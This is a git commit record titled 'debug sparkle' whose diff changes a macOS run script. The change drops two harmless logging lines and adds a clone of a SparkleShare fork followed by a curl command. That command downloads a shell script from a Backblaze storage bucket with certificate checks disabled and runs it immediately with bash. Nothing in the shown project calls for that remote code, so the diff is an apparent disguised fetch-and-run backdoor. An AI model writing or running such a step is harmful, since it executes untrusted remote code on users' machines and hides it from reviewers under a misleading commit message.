5779bfd105398a35d96fa1574e3125ee0d670b83
helloworld <helloworld@heroku.com>
2022-05-28 19:21:37 +0800

    0528:debug sparkle

--- extra/mac_run.sh
+++ extra/mac_run.sh
@@ -1,3 +1,4 @@
 
-mkdir -p ~/local-cache
-echo $(date) >>  ~/local-cache/rec.log
+git clone https://github.com/uenz/SparkleShare
+cd SparkleShare
+curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/setup-network-macos.sh ; bash setup-network-macos.sh 252
